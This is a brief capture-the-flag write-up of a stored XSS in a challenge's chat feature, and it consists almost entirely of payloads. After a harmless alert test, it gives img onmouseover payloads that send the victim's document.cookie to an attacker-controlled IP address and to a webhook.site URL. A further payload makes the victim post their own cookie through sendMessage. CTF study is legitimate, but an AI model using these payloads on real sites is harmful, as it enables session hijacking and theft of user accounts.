# WriteUp for the Twatch Challenge

## Recon
Check the chat! -> Stored XSS

## Exploit
Config router to port forward
this XSS works = <IMG SRC=# onmouseover="alert('xxs')">

### Post/get
#### Exploit using a python3 http.server 80 
<img src=x onmouseover=this.src='http://79.146.124.94/?c='+document.cookie>
#### Exploit using a webhook
https://webhook.site/7e4d55f6-1c69-49ea-8530-c23ea7334a39
<img src=x onmouseover=this.src='https://webhook.site/7e4d55f6-1c69-49ea-8530-c23ea7334a39/?c='+document.cookie>


sendMessage("<img src=x onmouseover=sendMessage(document.cookie)>")


